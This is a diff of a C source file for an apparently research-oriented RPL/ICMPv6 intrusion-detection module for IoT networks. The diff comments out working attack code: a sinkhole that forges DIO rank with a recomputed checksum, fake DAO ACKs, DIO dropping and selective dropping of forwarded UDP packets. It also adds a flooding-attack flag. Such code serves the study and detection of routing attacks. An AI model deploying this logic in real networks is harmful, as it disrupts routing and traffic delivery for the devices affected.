@@ -45,14 +45,12 @@
 #define LOG_MODULE "ICMP6-IDS"
 #define LOG_LEVEL LOG_LEVEL_INFO
 
-#define ATTACK_DROP_DIO 1
-#define ATTACK_FAKE_DAO 1
-
 struct icmp6_stats icmp6_stats;
-bool icmp6_stats_sink_hole = false;
-bool icmp6_stats_drop_fwd_udp = false;
+bool icmp6_stats_flooding_attack = false;
+
 // Note! By Makefile.include, the default setting is ROUTING_CONF_RPL_LITE 1
 /*---------------------------------------------------------------------------*/
+
 /* Check if the sender is the node's parent.  */
 static bool
 is_parent(const uip_ipaddr_t *addr, uint8_t instance_id, bool compare_mac)
@@ -128,21 +126,21 @@ process_dio_input(struct uip_icmp_hdr *hdr)
     icmp6_stats.dio_uc_recv++;
   }
 
-#if ATTACK_DROP_DIO
-  if(icmp6_stats_sink_hole) {
-    uint8_t *payload = (uint8_t *)(hdr + 1);
-    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], false)) {
-      LOG_INFO("allowing DIO from parent ");
-      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
-      LOG_INFO_("\n");
-    } else {
-      LOG_INFO("dropping DIO from ");
-      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
-      LOG_INFO_("\n");
-      return NETSTACK_IP_DROP;
-    }
-  }
-#endif /* ATTACK_DROP_DIO */
+// #if ATTACK_DROP_DIO
+  // if(icmp6_stats_sink_hole) {
+  //   uint8_t *payload = (uint8_t *)(hdr + 1);
+  //   if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], false)) {
+  //     LOG_INFO("allowing DIO from parent ");
+  //     LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+  //     LOG_INFO_("\n");
+  //   } else {
+  //     LOG_INFO("dropping DIO from ");
+  //     LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+  //     LOG_INFO_("\n");
+  //     return NETSTACK_IP_DROP;
+  //   }
+  // }
+// #endif /* ATTACK_DROP_DIO */
 
   return NETSTACK_IP_PROCESS;
 }
@@ -152,29 +150,29 @@ process_dao_input(struct uip_icmp_hdr *hdr)
 {
   icmp6_stats.dao_recv++;
 
-#if ATTACK_FAKE_DAO
-#if ROUTING_CONF_RPL_LITE
-  if(icmp6_stats_sink_hole) {
-    uint8_t *payload = (uint8_t *)(hdr + 1);
-    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], true)) {
-      LOG_INFO("drop DAO from parent ");
-      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
-      LOG_INFO_("\n");
-    } else {
-      uint8_t flags = payload[1];
-      uint8_t sequence = payload[3];
-      if(flags & RPL_DAO_K_FLAG) {
-        /* Node requests a DAO ACK */
-        LOG_INFO("sending fake DAO ACK to ");
-        LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
-        LOG_INFO_("\n");
-        rpl_timers_schedule_dao_ack(&UIP_IP_BUF->srcipaddr, sequence);
-      }
-    }
-    return NETSTACK_IP_DROP;
-  }
-#endif /* ROUTING_CONF_RPL_LITE */
-#endif /* ATTACK_FAKE_DAO */
+// #if ATTACK_FAKE_DAO
+// #if ROUTING_CONF_RPL_LITE
+//   if(icmp6_stats_sink_hole) {
+//     uint8_t *payload = (uint8_t *)(hdr + 1);
+//     if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], true)) {
+//       LOG_INFO("drop DAO from parent ");
+//       LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+//       LOG_INFO_("\n");
+//     } else {
+//       uint8_t flags = payload[1];
+//       uint8_t sequence = payload[3];
+//       if(flags & RPL_DAO_K_FLAG) {
+//         /* Node requests a DAO ACK */
+//         LOG_INFO("sending fake DAO ACK to ");
+//         LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+//         LOG_INFO_("\n");
+//         rpl_timers_schedule_dao_ack(&UIP_IP_BUF->srcipaddr, sequence);
+//       }
+//     }
+//     return NETSTACK_IP_DROP;
+//   }
+// #endif /* ROUTING_CONF_RPL_LITE */
+// #endif /* ATTACK_FAKE_DAO */
 
   return NETSTACK_IP_PROCESS;
 }
@@ -228,6 +226,7 @@ ip_input(void)
 static void
 process_dis_output(struct uip_icmp_hdr *hdr)
 {
+  LOG_INFO("process_dis_output\n");
   if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
     /* Multicast */
     icmp6_stats.dis_mc_sent++;
@@ -250,20 +249,22 @@ process_dio_output(struct uip_icmp_hdr *hdr)
     icmp6_stats.dio_uc_sent++;
   }
 
-  if(icmp6_stats_sink_hole) {
-    uint16_t new_rank = 128;
-    payload = (uint8_t *)(hdr + 1);
-    LOG_INFO("sending fake DIO: i: %u ver: %u rank: %u => rank: %u\n",
-             payload[0], payload[1],
-             ((uint16_t)payload[2] << 8) + payload[3],
-             new_rank);
-    payload[2] = new_rank >> 8;
-    payload[3] = new_rank & 0xff;
+  
 
-    /* Recalculate checksum */
-    hdr->icmpchksum = 0;
-    hdr->icmpchksum = ~uip_icmp6chksum();
-  }
+  // if(icmp6_stats_sink_hole) {
+  //   uint16_t new_rank = 128;
+  //   payload = (uint8_t *)(hdr + 1);
+  //   LOG_INFO("sending fake DIO: i: %u ver: %u rank: %u => rank: %u\n",
+  //            payload[0], payload[1],
+  //            ((uint16_t)payload[2] << 8) + payload[3],
+  //            new_rank);
+  //   payload[2] = new_rank >> 8;
+  //   payload[3] = new_rank & 0xff;
+
+  //   /* Recalculate checksum */
+  //   hdr->icmpchksum = 0;
+  //   hdr->icmpchksum = ~uip_icmp6chksum();
+  // }
 }
 /*---------------------------------------------------------------------------*/
 static void
@@ -317,12 +318,12 @@ ip_output(const linkaddr_t *localdest)
     }
   }
 
-  if(!is_from_me && icmp6_stats_drop_fwd_udp && proto == UIP_PROTO_UDP) {
-    LOG_INFO("Dropping UDP forwarded from ");
-    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
-    LOG_INFO_("\n");
-    return NETSTACK_IP_DROP;
-  }
+  // if(!is_from_me && icmp6_stats_drop_fwd_udp && proto == UIP_PROTO_UDP) {
+  //   LOG_INFO("Dropping UDP forwarded from ");
+  //   LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+  //   LOG_INFO_("\n");
+  //   return NETSTACK_IP_DROP;
+  // }
 
   return NETSTACK_IP_PROCESS;
 }
